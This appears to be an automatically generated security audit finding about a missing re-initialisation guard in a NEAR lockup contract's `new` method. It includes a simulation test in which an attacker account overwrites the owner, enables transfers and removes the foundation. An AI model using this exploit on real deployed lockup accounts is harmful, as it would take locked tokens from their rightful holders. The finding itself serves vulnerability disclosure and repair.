## Finding



### Title
Missing `state_exists` guard in `LockupContract::new` allows re-initialization and full state overwrite by an unprivileged caller - (File: lockup/src/lib.rs)

### Summary
`LockupContract::new` is a public `#[init]` method that, unlike every other `new` function in this repository, does not assert `!env::state_exists()` before writing state. Because near-sdk 3.1.0's `#[init]` macro does not auto-generate this check, and because calling a public contract method requires no special access key on the receiver account, any unprivileged attacker can send a plain `FunctionCall("new", ...)` transaction to an already-deployed lockup account and overwrite its entire state, including `owner_account_id`, `vesting_information`, `staking_information`, `lockup_information`, and `foundation_account_id`.

### Finding Description
The broken binding: `state(lockup_account) before new() == state(lockup_account) after new()` should hold false only on the very first call and `new()` should be uncallable thereafter — i.e. `initialized_once(lockup_account) == true` must be enforced. It isn't.

Compare the two `new` implementations:
- `lockup-factory/src/lib.rs` `LockupFactory::new`: [1](#0-0) , which explicitly does `assert!(!env::state_exists(), "The contract is already initialized");`.
- `lockup/src/lib.rs` `LockupContract::new`: [2](#0-1) , which performs only argument-shape validation (`is_valid_account_id`, vesting/foundation consistency asserts) and never checks `env::state_exists()`.

The same manual guard is present in every sibling contract's `new`, confirming this is expected boilerplate that near-sdk 3.1.0's `#[init]` macro does not add automatically, and that it was simply omitted here. `grep_search` for `state_exists` in the repo shows it present in `lockup-factory`, `multisig`, `staking-pool-factory`, `staking-pool`, `voting`, and `whitelist`, but absent from `lockup`.

Because `new` is a normal public method, an unprivileged attacker can call it on any already-initialized lockup account by simply sending a `FunctionCall` transaction with `receiver_id = <victim_lockup_account_id>`, `method_name = "new"`, and attacker-chosen arguments — no key on the victim account is required, exactly as any external account calls any public contract method. The account balance (`env::account_balance()`), which already holds the locked/unvested NEAR, is captured as the new `lockup_amount` under attacker-controlled `owner_account_id`, `transfers_information`, `vesting_schedule` (or `None`), and `foundation_account_id`. Setting `vesting_schedule = None` forces `foundation_account_id` to also be `None` per the assert at [3](#0-2) , so the foundation's termination path (`assert_called_by_foundation` in `foundation.rs`) can never run again — matching the question's premise. `staking_information` is also reset to `None`, discarding any prior staking state records, and `owner_account_id` is fully attacker-controlled, letting the attacker become the new owner and withdraw the balance through the owner methods once transfers are configured as enabled.

No existing guard prevents this: `assert_owner`, `assert_self()`, `is_promise_success()` etc. are used elsewhere (owner.rs/foundation.rs/staking.rs) but never inside `new`, and there is no `#[private]` attribute restricting the caller.

### Impact Explanation
The attacker seizes control of the lockup contract account and its NEAR balance, which is exactly "locked/unvested lockup tokens released to a party not entitled to them" — Critical severity. The attack is repeatable against any deployed lockup account whose ID is known (lockup account IDs are deterministically derived from the owner account ID in the factory, `format!("{}.{}", hex::encode(sha256(owner)[..20]), factory_id)`, so they are trivially enumerable/predictable), so the blast radius is every lockup contract deployed by the factory in this codebase.

### Likelihood Explanation
No special preconditions: the attacker needs only enough gas to make one function call and knowledge of the target lockup account ID (which is public/derivable). No foundation, owner, or multisig cooperation, no key compromise, and no redeploy is required — this is a pure logic-level omission of an initialization guard reachable through the standard `new` entrypoint.

### Recommendation
Add `assert!(!env::state_exists(), "The contract is already initialized");` as the first line of `LockupContract::new` in `lockup/src/lib.rs`, mirroring the guard already present in every other contract's `new` in this repository (`lockup-factory`, `multisig`, `staking-pool-factory`, `staking-pool`, `voting`, `whitelist`).

### Proof of Concept
```rust
// lockup/tests/spec.rs (near-sdk-sim / RuntimeStandalone style, matching existing spec.rs setup)
#[test]
fn test_reinit_overwrites_state() {
    let lockup_amount = to_yocto("1000");
    let (root, _foundation, owner, _staking_pool) = basic_setup();

    let lockup = deploy!(
        contract: LockupContractContract,
        contract_id: LOCKUP_ACCOUNT_ID.to_string(),
        bytes: &LOCKUP_WASM_BYTES,
        signer_account: root,
        deposit: MIN_BALANCE_FOR_STORAGE + lockup_amount,
        gas: MAX_GAS,
        init_method: new(
            owner.account_id.clone(),
            0.into(),
            None,
            TransfersInformation::TransfersDisabled {
                transfer_poll_account_id: "transfer-poll".to_string(),
            },
            None,
            None,
            STAKING_POOL_WHITELIST_ACCOUNT_ID.to_string(),
            None
        )
    );

    // Binding under test BEFORE re-init: owner_account_id == owner.account_id
    let owner_before: AccountId =
        owner.view_method_call(lockup.contract.get_owner_account_id()).unwrap_json();
    assert_eq!(owner_before, owner.account_id.clone());

    // Attacker (unrelated account, no key on lockup account) calls `new` again,
    // taking over as owner, with foundation_account_id = None and no vesting.
    let attacker = root.create_user("attacker".to_string(), to_yocto("100"));
    let res = attacker.call(
        LOCKUP_ACCOUNT_ID.to_string(),
        "new",
        &serde_json::to_vec(&(
            attacker.account_id.clone(),          // owner_account_id
            WrappedDuration::from(0),              // lockup_duration
            None::<WrappedTimestamp>,               // lockup_timestamp
            TransfersInformation::TransfersEnabled { // transfers already enabled
                transfers_timestamp: 0.into(),
            },
            None::<VestingScheduleOrHash>,          // vesting_schedule = None
            None::<WrappedDuration>,                // release_duration
            STAKING_POOL_WHITELIST_ACCOUNT_ID.to_string(),
            None::<AccountId>,                      // foundation_account_id = None
        )).unwrap(),
        MAX_GAS,
        0,
    );
    res.assert_success(); // <-- should fail after fix, succeeds today

    // Binding AFTER re-init: owner_account_id changed to attacker, breaking
    // "initialization happens exactly once" and "foundation can terminate vesting".
    let owner_after: AccountId =
        owner.view_method_call(lockup.contract.get_owner_account_id()).unwrap_json();
    assert_eq!(owner_after, attacker.account_id.clone()); // demonstrates hijack
}

    #[init]
    pub fn new(
        owner_account_id: AccountId,
        lockup_duration: WrappedDuration,
        lockup_timestamp: Option<WrappedTimestamp>,
        transfers_information: TransfersInformation,
        vesting_schedule: Option<VestingScheduleOrHash>,
        release_duration: Option<WrappedDuration>,
        staking_pool_whitelist_account_id: AccountId,
        foundation_account_id: Option<AccountId>,
    ) -> Self {
        assert!(
            env::is_valid_account_id(owner_account_id.as_bytes()),
            "The account ID of the owner is invalid"
        );
        assert!(
            env::is_valid_account_id(staking_pool_whitelist_account_id.as_bytes()),
            "The staking pool whitelist account ID is invalid"
        );
        if let TransfersInformation::TransfersDisabled {
            transfer_poll_account_id,
        } = &transfers_information
        {
            assert!(
                env::is_valid_account_id(transfer_poll_account_id.as_bytes()),
                "The transfer poll account ID is invalid"
            );
        }
        let lockup_information = LockupInformation {
            lockup_amount: env::account_balance(),
            termination_withdrawn_tokens: 0,
            lockup_duration: lockup_duration.0,
            release_duration: release_duration.map(|d| d.0),
            lockup_timestamp: lockup_timestamp.map(|d| d.0),
            transfers_information,
        };
        let vesting_information = match vesting_schedule {
            None => {
                assert!(
                    foundation_account_id.is_none(),
                    "Foundation account can't be added without vesting schedule"
                );
                VestingInformation::None
            }
            Some(VestingScheduleOrHash::VestingHash(hash)) => VestingInformation::VestingHash(hash),
            Some(VestingScheduleOrHash::VestingSchedule(vs)) => {
                VestingInformation::VestingSchedule(vs)
            }
        };
        assert!(
            vesting_information == VestingInformation::None ||
                env::is_valid_account_id(foundation_account_id.as_ref().unwrap().as_bytes()),
            "Foundation account should be added for vesting schedule"
        );

        Self {
            owner_account_id,
            lockup_information,
            vesting_information,
            staking_information: None,
            staking_pool_whitelist_account_id,
            foundation_account_id,
        }
    }
